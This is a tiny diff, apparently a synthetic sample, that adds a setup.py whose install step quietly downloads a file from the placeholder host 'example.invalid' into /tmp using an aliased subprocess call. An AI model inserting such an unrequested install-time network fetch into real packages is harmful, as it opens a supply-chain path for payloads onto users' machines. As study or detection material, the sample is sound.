@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+from subprocess import call as c
+print "installing"
+c(["curl", "-o", "/tmp/x", "example.invalid/x"])
